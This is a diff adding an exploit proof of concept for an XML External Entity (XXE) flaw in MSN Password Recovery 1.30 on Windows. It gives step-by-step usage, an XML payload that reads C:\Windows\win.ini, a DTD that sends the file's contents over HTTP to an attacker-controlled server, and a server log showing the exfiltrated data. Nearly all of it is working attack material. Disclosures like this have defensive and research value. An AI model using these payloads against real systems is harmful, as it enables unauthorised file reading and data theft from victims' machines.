@@ -1,0 +1,42 @@
+# Exploit Title: MSN Password Recovery 1.30 - XML External Entity Injection
+# Exploit Author: ZwX
+# Exploit Date: 2020-01-08
+# Vendor Homepage : https://www.top-password.com/
+# Software Link: https://www.top-password.com/download/MSNPRSetup.exe
+# Tested on OS: Windows 10
+
+
+[+] Exploit : (PoC)
+===================
+1) python -m SimpleHTTPServer 8000
+2) Create file (.xml)
+3) Create file Payload.dtd
+4) Open the software MSN Password Recovery
+5) Click the 'Help' button and a 'Msn Password Recovery' window opens
+6) Click the 'Favorites' tab and add in Path Current the path of your file (.XML) Ex : file:///C:/Users/ZwX/Desktop/file.xml
+7) Click the 'View' button
+8) External Entity Injection Successful
+
+
+[+] XXE.xml :
+==============
+<?xml version="1.0"?>
+<!DOCTYPE test [
+<!ENTITY % file SYSTEM "C:\Windows\win.ini">
+<!ENTITY % dtd SYSTEM "http://localhost:8000/payload.dtd">
+%dtd;]>
+<pwn>&send;</pwn>
+
+[+] Payload.dtd :
+=================
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8000?%file;'>">
+%all;
+
+
+[+] Result Exploitation :
+=========================
+C:\>python -m SimpleHTTPServer 8000
+Serving HTTP on 0.0.0.0 port 8000 ...
+ZwX-PC - - [08/Jan/2020 20:32:36] "GET /payload.dtd HTTP/1.1" 200 -
+ZwX-PC - - [08/Jan/2020 20:32:37] "GET /?;%20for%2016-bit%20app%20support[fonts][extensions][mci%20extensions][files][Mail]MAPI=1 HTTP/1.1" 200 -
